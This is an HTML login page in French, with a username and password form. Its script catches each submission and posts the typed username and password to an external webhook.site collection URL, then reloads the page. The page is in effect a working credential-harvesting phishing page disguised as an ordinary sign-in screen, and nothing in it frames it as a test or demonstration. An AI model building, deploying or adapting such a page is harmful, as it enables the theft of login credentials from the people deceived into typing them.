<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page de Connexion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            border: none;
            color: white;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Connexion</h2>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Nom d'utilisateur" required><br>
            <input type="password" id="password" name="password" placeholder="Mot de passe" required><br>
            <input type="submit" value="Se connecter">
        </form>
    </div>
    <script>
        // Intercepter la soumission du formulaire
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault(); // Empêche la soumission classique du formulaire

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            try {
                const response = await fetch('https://webhook.site/3e17ccde-8a6c-4d7d-8b4d-38ade87aac0f', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
                });

                if (response.ok) {
                    // Affiche une alerte en cas de succès et recharge la page
                    alert('Données envoyées avec succès.');
                } else {
                    // Affiche une alerte en cas d'erreur de réponse
                    alert('Erreur lors de l\'envoi des données. Vérifiez le serveur cible.');
                }
            } finally {
                // Recharge la page après la tentative d'envoi
                window.location.reload();
            }
        });
    </script>
</body>
</html>
